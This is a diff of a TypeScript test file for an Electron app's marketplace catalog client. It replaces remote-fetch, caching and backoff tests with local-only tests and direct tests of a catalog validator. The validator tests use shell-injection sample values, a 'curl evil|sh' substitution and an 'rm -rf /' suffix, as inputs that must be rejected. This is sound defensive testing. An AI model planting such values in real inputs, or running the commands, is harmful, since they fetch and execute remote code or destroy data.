@@ -1,7 +1,8 @@
 // electron/tests/marketplace/client.test.ts
 //
-// fetchCatalog：mock fetch 验证（远程成功 / 远程失败→本地回退）。
-// searchItems / groupByCategory：纯函数验证。
+// 2026-11-02 网络获取下线后：fetchCatalog 纯本地直读（原「远程优先 + 本地回退
+// + SWR/退避」机制与其测试整体退役——远端获取只保留 momo-hub）。
+// 保留面：searchItems / groupByCategory 纯函数 + validateCatalog S1 注入防线直测。
 // 设置 AP_USER_DATA_DIR 到临时目录，避免 logger 写入真实用户目录。
 
 import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
@@ -10,16 +11,10 @@ import os from 'node:os';
 import path from 'node:path';
 import {
   fetchCatalog,
+  readBundledCatalog,
+  validateCatalog,
   searchItems,
   groupByCategory,
-  __resetCatalogCacheForTest,
-  __rewindCatalogCacheForTest,
-  __rewindFailureBackoffForTest,
-  __setBackoffJitterForTest,
-  __getFailureBackoffRemainingForTest,
-  CATALOG_CACHE_TTL_MS,
-  CATALOG_FAILURE_BACKOFF_MS,
-  CATALOG_FAILURE_BACKOFF_STEPS_MS,
 } from '../../src/main/marketplace/client';
 
 // 本地内置 catalog 条目数动态派生（防目录增删后计数锁漂移——2026-10-20 全量首跑实证）
@@ -28,30 +23,6 @@ const LOCAL_ITEM_COUNT = (JSON.parse(fs.readFileSync(LOCAL_CATALOG_PATH, 'utf-8'
 import type { Catalog } from '../../src/main/marketplace/types';
 
 const tmpRoot = path.join(os.tmpdir(), `ap-mp-client-test-${Date.now()}`);
-const fakeCatalog: Catalog = {
-  version: '9.9',
-  updatedAt: '2026-01-01T00:00:00Z',
-  items: [
-    {
-      id: 'agent-x',
-      type: 'agent',
-      slug: 'x-agent',
-      name: 'X Agent',
-      version: '1.0.0',
-      author: 'tester',
-      description: 'a testing agent',
-      readme: '# X',
-      tags: ['test', 'demo'],
-      category: 'dev',
-      iconEmoji: '🧪',
-      verificationStatus: 'community',
-      downloadUrl: '',
-      checksum: '',
-      sizeBytes: 1,
-      installCount: 0,
-    },
-  ],
-};
 
 let fetchSpy: ReturnType<typeof vi.spyOn>;
 
@@ -59,286 +30,35 @@ beforeEach(() => {
   fs.mkdirSync(tmpRoot, { recursive: true });
   process.env.AP_USER_DATA_DIR = tmpRoot;
   fetchSpy = vi.spyOn(globalThis, 'fetch') as unknown as typeof fetchSpy;
-  // I6：fetchCatalog 现有进程内 TTL 缓存——逐用例清零，隔离缓存副作用
-  __resetCatalogCacheForTest();
 });
 
 afterEach(() => {
   fetchSpy.mockRestore();
   vi.restoreAllMocks();
-  __resetCatalogCacheForTest();
   fs.rmSync(tmpRoot, { recursive: true, force: true });
   delete process.env.AP_USER_DATA_DIR;
 });
 
-// D13：全文件钉零抖动——固定档位回卷（60s+1 等）依赖确定性窗口
-const __originalJitter = (): number => Math.random() * 0.2;
-beforeEach(() => {
-  __setBackoffJitterForTest(() => 0);
-});
-afterEach(() => {
-  __setBackoffJitterForTest(__originalJitter); // 生产默认原引用（Oracle P2：防默认值漂移分叉）
-});
-
-describe('marketplace/client fetchCatalog', () => {
-  it('远程成功时返回远程 catalog', async () => {
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () => fakeCatalog,
-    } as Response);
-
-    const catalog = await fetchCatalog('https://example.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledOnce();
-    expect(catalog.version).toBe('9.9');
-    expect(catalog.items).toHaveLength(1);
-    expect(catalog.items[0]!.id).toBe('agent-x');
-  });
-
-  it('远程非 2xx 时回退本地 catalog', async () => {
-    fetchSpy.mockResolvedValue({ ok: false, status: 500 } as Response);
-
-    const catalog = await fetchCatalog('https://example.test/catalog.json');
-    // 本地内置 catalog 预填充 item（2026-11-02 极简化后仅 1 条；条数锁见 LOCAL_ITEM_COUNT 用例）
-    expect(catalog.items.length).toBeGreaterThanOrEqual(1);
+describe('marketplace/client fetchCatalog（本地直读）', () => {
+  it('返回打包内置 catalog（version/条数与 catalog.json 一致）', async () => {
+    const catalog = await fetchCatalog();
     expect(catalog.version).toBe('1.0');
+    expect(catalog.items).toHaveLength(LOCAL_ITEM_COUNT);
   });
 
-  it('远程抛错时回退本地 catalog', async () => {
-    fetchSpy.mockRejectedValue(new Error('network down'));
-
-    const catalog = await fetchCatalog('https://example.test/catalog.json');
-    expect(catalog.items.length).toBe(LOCAL_ITEM_COUNT);
+  it('零网络回归锁：全程不发任何 fetch（网络获取下线核心语义）', async () => {
+    fetchSpy.mockImplementation(() => {
+      throw new Error('fetchCatalog 不应触发网络请求');
+    });
+    const catalog = await fetchCatalog();
     expect(catalog.version).toBe('1.0');
-  });
-});
-
-// === I6 契约锁（终审修复）：fetchCatalog 进程内缓存 ===
-// 成功结果缓存 5 分钟；失败（远程非 2xx / 抛错 / 校验拒）进 60s 退避负缓存。
-// 方案 A（2026-09-22）：退避窗口内二次调用零网络请求、直接本地回退——修复
-// 「Agent/MCP/Skill 面板切换每次都吃满网络超时」（离线环境成功缓存从未建立，
-// 每次列表都同步重试远程）。窗口过期后重试远程，网络恢复即可拿到新目录。
-
-describe('marketplace/client fetchCatalog TTL 缓存（I6）', () => {
-  function okRemote(): void {
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () => fakeCatalog,
-    } as Response);
-  }
-
-  it('TTL 内二次调用不发网络请求（命中缓存，同对象）', async () => {
-    okRemote();
-    const first = await fetchCatalog('https://example.test/catalog.json');
-    const second = await fetchCatalog('https://example.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledOnce();
-    expect(second.version).toBe(first.version);
-    expect(second).toBe(first); // 缓存命中返回同一引用（零拷贝）
+    expect(fetchSpy).not.toHaveBeenCalled();
   });
 
-  it('缓存过期后重取（回拨 TTL+1 → 再次发网络请求）', async () => {
-    okRemote();
-    await fetchCatalog('https://example.test/catalog.json');
-    __rewindCatalogCacheForTest(CATALOG_CACHE_TTL_MS + 1);
-    await fetchCatalog('https://example.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledTimes(2);
-  });
-
-  it('失败进退避：远程抛错 → 窗口内二次调用零网络请求（直接本地）', async () => {
-    fetchSpy.mockRejectedValue(new Error('fetch failed'));
-    await fetchCatalog('https://example.test/catalog.json'); // 失败 → 本地回退 + 进退避
-    const second = await fetchCatalog('https://example.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledOnce();
-    expect(second.version).toBe('1.0');
-  });
-
-  it('失败进退避：远程非 2xx → 同样进入退避窗口', async () => {
-    fetchSpy.mockResolvedValue({ ok: false, status: 503 } as Response);
-    await fetchCatalog('https://example.test/catalog.json');
-    await fetchCatalog('https://example.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledOnce();
-  });
-
-  it('失败进退避：校验拒（200 但 catalog 非法）→ 同样进入退避窗口', async () => {
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () => ({ version: '9.9', updatedAt: 'x', items: 'nope' }),
-    } as Response);
-    await fetchCatalog('https://example.test/catalog.json');
-    await fetchCatalog('https://example.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledOnce();
-  });
-
-  it('退避窗口过期后重试远程（立即返回旧值，后台刷新后拿到远程目录）', async () => {
-    fetchSpy.mockRejectedValueOnce(new Error('offline'));
-    await fetchCatalog('https://example.test/catalog.json'); // 失败进退避 + 本地结果记为已知
-    __rewindFailureBackoffForTest(CATALOG_FAILURE_BACKOFF_MS + 1);
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () => fakeCatalog,
-    } as Response);
-    const catalog = await fetchCatalog('https://example.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledTimes(2); // 后台重试已发出（不阻塞调用方）
-    expect(catalog.version).toBe('1.0'); // 调用方立即拿已知旧值（本地）
-    // 等后台刷新落定（mock 链全微任务，setTimeout(0) 足够），下次调用命中 TTL 缓存
-    await new Promise((resolve) => setTimeout(resolve, 0));
-    const refreshed = await fetchCatalog('https://example.test/catalog.json');
-    expect(refreshed.version).toBe('9.9');
-    expect(fetchSpy).toHaveBeenCalledTimes(2);
-  });
-
-  it('不同 catalogUrl 的缓存互不干扰（按 URL 键控）', async () => {
-    okRemote();
-    await fetchCatalog('https://a.test/catalog.json');
-    await fetchCatalog('https://b.test/catalog.json');
-    expect(fetchSpy).toHaveBeenCalledTimes(2);
-  });
-});
-
-// === 回归锁（2026-10-08）：资源库切页不得阻塞在网络重试上（SWR） ===
-// 背景：远程 catalog URL 长期 404（实测 TLS 握手 + 往返 0.8~1.8s），成功缓存从未
-// 建立；旧实现「本地回退不缓存、退避窗口过期即同步重试远程」→ agent/mcp/skill
-// 切页每 60s 有一次吃到完整网络往返（用户观感「有时卡 1 秒」）。
-// 新语义：有已知结果（远程成功或本地回退）时立即返回旧值，重试转后台单飞。
-
-describe('marketplace/client fetchCatalog 切页不阻塞（SWR 回归锁）', () => {
-  const url = 'https://example.test/catalog.json';
-
-  it('退避过期 + 网络悬挂：调用方立即拿到本地结果（不等网络）', async () => {
-    fetchSpy.mockRejectedValueOnce(new Error('offline'));
-    await fetchCatalog(url); // 首次失败 → 本地回退 + 进退避 + 记为已知结果
-    __rewindFailureBackoffForTest(CATALOG_FAILURE_BACKOFF_MS + 1);
-
-    // 网络悬挂（模拟慢 TLS / 挂起的远程往返）：旧实现在此同步吃满 3s abort
-    // 超时才回退本地；新实现必须立即返回（用例预算 2s，旧实现必超时）。
-    fetchSpy.mockImplementation(
-      () => new Promise(() => {}) as unknown as Promise<Response>,
-    );
-    const startedAt = Date.now();
-    const catalog = await fetchCatalog(url);
-    expect(catalog.version).toBe('1.0');
-    expect(Date.now() - startedAt).toBeLessThan(1000);
-  }, 2000);
-
-  it('退避过期 + 并发两路调用：后台重试单飞（只发一次网络请求）', async () => {
-    fetchSpy.mockRejectedValueOnce(new Error('offline'));
-    await fetchCatalog(url);
-    __rewindFailureBackoffForTest(CATALOG_FAILURE_BACKOFF_MS + 1);
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () => fakeCatalog,
-    } as Response);
-
-    // 并发两路（模拟 CapabilityTabs 同时拉 mcp + skill 两个 list）
-    const [a, b] = await Promise.all([fetchCatalog(url), fetchCatalog(url)]);
-    expect(fetchSpy).toHaveBeenCalledTimes(2); // 首败 1 + 后台单飞 1（旧实现阻塞式共 3）
-    expect(a.version).toBe('1.0'); // 两路都立即拿已知旧值，不阻塞
-    expect(b.version).toBe('1.0');
-
-    await new Promise((resolve) => setTimeout(resolve, 0)); // 等后台刷新落定
-    const third = await fetchCatalog(url);
-    expect(fetchSpy).toHaveBeenCalledTimes(2); // TTL 缓存命中，零网络
-    expect(third.version).toBe('9.9');
-  });
-});
-
-// === 失败指数退避（M2.2 P2-9）：连续失败 60s → 5min → 30min 封顶 ===
-// 背景：远程 catalog URL 持久 404 / 网络长期不可达时，固定 60s 退避窗口意味着
-// 每分钟一次失败重试 + 刷屏日志。指数序列用 __rewindFailureBackoffForTest
-// 推进窗口（本文件既有惯例——不伪造系统时钟），窗口值经专用 getter 断言。
-
-describe('marketplace/client fetchCatalog 失败指数退避（P2-9）', () => {
-  const url = 'https://example.test/catalog.json';
-  const flush = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0));
-
-  it('退避序列常量锁定：60s → 5min → 30min', () => {
-    expect(CATALOG_FAILURE_BACKOFF_STEPS_MS).toEqual([60_000, 300_000, 1_800_000]);
-    expect(CATALOG_FAILURE_BACKOFF_MS).toBe(60_000); // 首档兼容导出
-  });
-
-  it('D13 抖动：注入 0.2 因子 → 窗口落在 (档位, 档位×1.2]', async () => {
-    fetchSpy.mockRejectedValue(new Error('down'));
-    __setBackoffJitterForTest(() => 0.2);
-    await fetchCatalog(url);
-    const remaining = __getFailureBackoffRemainingForTest(url);
-    expect(remaining).toBeGreaterThan(CATALOG_FAILURE_BACKOFF_MS);
-    expect(remaining).toBeLessThanOrEqual(CATALOG_FAILURE_BACKOFF_MS * 1.2);
-    __setBackoffJitterForTest(() => 0); // 还原（afterEach 兜底再还原一次）
-  });
-
-  it('连续失败退避序列 60s → 5min → 30min 封顶（第 4 次仍 30min）', async () => {
-    fetchSpy.mockRejectedValue(new Error('down'));
-
-    await fetchCatalog(url); // 失败 #1 → 60s
-    expect(__getFailureBackoffRemainingForTest(url)).toBeGreaterThan(55_000);
-    expect(__getFailureBackoffRemainingForTest(url)).toBeLessThanOrEqual(60_000);
-
-    __rewindFailureBackoffForTest(60_000 + 1); // 60s 窗口流逝 → SWR 后台重试
-    await fetchCatalog(url); // 失败 #2 → 5min
-    await flush();
-    expect(__getFailureBackoffRemainingForTest(url)).toBeGreaterThan(4 * 60_000);
-    expect(__getFailureBackoffRemainingForTest(url)).toBeLessThanOrEqual(5 * 60_000);
-
-    __rewindFailureBackoffForTest(5 * 60_000 + 1); // 5min 窗口流逝
-    await fetchCatalog(url); // 失败 #3 → 30min
-    await flush();
-    expect(__getFailureBackoffRemainingForTest(url)).toBeGreaterThan(29 * 60_000);
-    expect(__getFailureBackoffRemainingForTest(url)).toBeLessThanOrEqual(30 * 60_000);
-
-    __rewindFailureBackoffForTest(30 * 60_000 + 1); // 30min 窗口流逝
-    await fetchCatalog(url); // 失败 #4 → 封顶仍 30min
-    await flush();
-    expect(__getFailureBackoffRemainingForTest(url)).toBeGreaterThan(29 * 60_000);
-    expect(__getFailureBackoffRemainingForTest(url)).toBeLessThanOrEqual(30 * 60_000);
-
-    expect(fetchSpy).toHaveBeenCalledTimes(4); // 每个窗口过期恰好一次重试
-  });
-
-  it('成功清零：失败两次后成功 → 退避清空，再失败从 60s 首档重新起步', async () => {
-    fetchSpy.mockRejectedValue(new Error('down'));
-    await fetchCatalog(url); // 失败 #1 → 60s
-    __rewindFailureBackoffForTest(60_000 + 1);
-    await fetchCatalog(url); // 失败 #2 → 5min
-    await flush();
-    expect(__getFailureBackoffRemainingForTest(url)).toBeGreaterThan(4 * 60_000);
-
-    __rewindFailureBackoffForTest(5 * 60_000 + 1); // 窗口流逝 → 后台重试成功
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () => fakeCatalog,
-    } as Response);
-    await fetchCatalog(url);
-    await flush();
-    expect(__getFailureBackoffRemainingForTest(url)).toBe(0); // 成功清零
-
-    __rewindCatalogCacheForTest(CATALOG_CACHE_TTL_MS + 1); // TTL 过期 → 下次走网络
-    fetchSpy.mockRejectedValue(new Error('down again'));
-    await fetchCatalog(url); // 再失败 → 60s 首档（非 5min 续档）
-    await flush();
-    expect(__getFailureBackoffRemainingForTest(url)).toBeGreaterThan(55_000);
-    expect(__getFailureBackoffRemainingForTest(url)).toBeLessThanOrEqual(60_000);
-  });
-
-  it('升级后的退避窗口内零网络请求（5min 窗口内反复调用不再重试）', async () => {
-    fetchSpy.mockRejectedValue(new Error('down'));
-    await fetchCatalog(url); // 失败 #1（60s）
-    __rewindFailureBackoffForTest(60_000 + 1);
-    await fetchCatalog(url); // 失败 #2（5min）
-    await flush();
-    expect(fetchSpy).toHaveBeenCalledTimes(2);
-
-    // 5min 窗口内：流逝 1min / 再流逝 2min 后各调用一次（模拟面板高频切换）
-    __rewindFailureBackoffForTest(60_000);
-    await fetchCatalog(url);
-    __rewindFailureBackoffForTest(2 * 60_000);
-    await fetchCatalog(url);
-    await flush();
-    expect(fetchSpy).toHaveBeenCalledTimes(2); // 窗口内零网络请求
+  it('与 readBundledCatalog 同源（镜像自愈等确定性本地清单消费方共用同一份）', async () => {
+    const a = await fetchCatalog();
+    const b = readBundledCatalog();
+    expect(a).toEqual(b);
   });
 });
 
@@ -428,58 +148,19 @@ describe('marketplace/client groupByCategory', () => {
       updatedAt: '2026-01-01',
       items: [
         {
-          id: '1',
-          type: 'agent',
-          slug: 'a1',
-          name: 'A1',
-          version: '1.0.0',
-          author: '',
-          description: '',
-          readme: '',
-          tags: [],
-          category: 'dev',
-          iconEmoji: '🤖',
-          verificationStatus: 'official',
-          downloadUrl: '',
-          checksum: '',
-          sizeBytes: 0,
-          installCount: 0,
+          id: '1', type: 'agent', slug: 'a1', name: 'A1', version: '1.0.0', author: '',
+          description: '', readme: '', tags: [], category: 'dev', iconEmoji: '🤖',
+          verificationStatus: 'official', downloadUrl: '', checksum: '', sizeBytes: 0, installCount: 0,
         },
         {
-          id: '2',
-          type: 'agent',
-          slug: 'a2',
-          name: 'A2',
-          version: '1.0.0',
-          author: '',
-          description: '',
-          readme: '',
-          tags: [],
-          category: 'writing',
-          iconEmoji: '🤖',
-          verificationStatus: 'official',
-          downloadUrl: '',
-          checksum: '',
-          sizeBytes: 0,
-          installCount: 0,
+          id: '2', type: 'agent', slug: 'a2', name: 'A2', version: '1.0.0', author: '',
+          description: '', readme: '', tags: [], category: 'writing', iconEmoji: '🤖',
+          verificationStatus: 'official', downloadUrl: '', checksum: '', sizeBytes: 0, installCount: 0,
         },
         {
-          id: '3',
-          type: 'agent',
-          slug: 'a3',
-          name: 'A3',
-          version: '1.0.0',
-          author: '',
-          description: '',
-          readme: '',
-          tags: [],
-          category: 'dev',
-          iconEmoji: '🤖',
-          verificationStatus: 'official',
-          downloadUrl: '',
-          checksum: '',
-          sizeBytes: 0,
-          installCount: 0,
+          id: '3', type: 'agent', slug: 'a3', name: 'A3', version: '1.0.0', author: '',
+          description: '', readme: '', tags: [], category: 'dev', iconEmoji: '🤖',
+          verificationStatus: 'official', downloadUrl: '', checksum: '', sizeBytes: 0, installCount: 0,
         },
       ],
     };
@@ -495,7 +176,7 @@ describe('marketplace/client groupByCategory', () => {
   });
 });
 
-describe('marketplace/client fetchCatalog 安全校验（S1）', () => {
+describe('marketplace/client validateCatalog 安全校验（S1）', () => {
   /** 构造单个 item 的最小 catalog，字段可覆盖（默认全部合法） */
   function makeCatalog(itemOverrides: Record<string, unknown>): Catalog {
     return {
@@ -525,59 +206,49 @@ describe('marketplace/client fetchCatalog 安全校验（S1）', () => {
     };
   }
 
-  /** 期望远程 catalog 被判为不可信 → 回退本地内置（26 items / version 1.0——2026-10-08 预设库漂移对齐后） */
-  async function expectLocalFallback(catalog: unknown): Promise<void> {
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () => catalog,
-    } as Response);
-    const result = await fetchCatalog('https://example.test/catalog.json');
-    expect(result.version).toBe('1.0');
-    expect(result.items).toHaveLength(LOCAL_ITEM_COUNT);
+  /** 任何一项不合法都视为整个 catalog 被篡改/损坏 → 直接抛错 */
+  function expectRejected(catalog: unknown): void {
+    expect(() => validateCatalog(catalog)).toThrow();
   }
 
-  it('item.slug 含 shell 元字符 → 远程 catalog 整体拒绝，回退本地', async () => {
-    await expectLocalFallback(makeCatalog({ slug: 'x"$(curl evil|sh)"' }));
+  it('item.slug 含 shell 元字符 → 整体拒绝（抛错）', () => {
+    expectRejected(makeCatalog({ slug: 'x"$(curl evil|sh)"' }));
   });
 
-  it('item.version 含 shell 元字符 → 回退本地', async () => {
-    await expectLocalFallback(makeCatalog({ version: '1.0; rm -rf /' }));
+  it('item.version 含 shell 元字符 → 拒绝', () => {
+    expectRejected(makeCatalog({ version: '1.0; rm -rf /' }));
   });
 
-  it('item.type 非法枚举 → 回退本地', async () => {
-    await expectLocalFallback(makeCatalog({ type: 'evil' }));
+  it('item.type 非法枚举 → 拒绝', () => {
+    expectRejected(makeCatalog({ type: 'evil' }));
   });
 
-  it('downloadUrl 非 https → 回退本地', async () => {
-    await expectLocalFallback(
-      makeCatalog({ downloadUrl: 'http://evil.test/pkg.tar.gz' }),
-    );
+  it('downloadUrl 非 https → 拒绝', () => {
+    expectRejected(makeCatalog({ downloadUrl: 'http://evil.test/pkg.tar.gz' }));
   });
 
-  it('checksum 非 sha256 hex → 回退本地', async () => {
-    await expectLocalFallback(
+  it('checksum 非 sha256 hex → 拒绝', () => {
+    expectRejected(
       makeCatalog({ downloadUrl: 'https://ok.test/pkg.tar.gz', checksum: 'not-hex!' }),
     );
   });
 
-  it('items 非数组 → 回退本地', async () => {
-    await expectLocalFallback({ version: '9.9', updatedAt: 'x', items: 'nope' });
+  it('items 非数组 → 拒绝', () => {
+    expectRejected({ version: '9.9', updatedAt: 'x', items: 'nope' });
   });
 
-  it('合法远程 catalog（https downloadUrl + sha256 checksum）→ 正常返回远程内容', async () => {
-    fetchSpy.mockResolvedValue({
-      ok: true,
-      status: 200,
-      json: async () =>
-        makeCatalog({
-          downloadUrl: 'https://ok.test/pkg.tar.gz',
-          checksum: 'a'.repeat(64),
-        }),
-    } as Response);
-    const catalog = await fetchCatalog('https://example.test/catalog.json');
-    expect(catalog.version).toBe('9.9');
-    expect(catalog.items).toHaveLength(1);
-    expect(catalog.items[0]!.slug).toBe('x-agent');
+  it('顶层缺 version/updatedAt → 拒绝', () => {
+    expectRejected({ items: [] });
+  });
+
+  it('合法 catalog（https downloadUrl + sha256 checksum）→ 正常通过', () => {
+    const catalog = makeCatalog({
+      downloadUrl: 'https://ok.test/pkg.tar.gz',
+      checksum: 'a'.repeat(64),
+    });
+    const validated = validateCatalog(catalog);
+    expect(validated.version).toBe('9.9');
+    expect(validated.items).toHaveLength(1);
+    expect(validated.items[0]!.slug).toBe('x-agent');
   });
 });
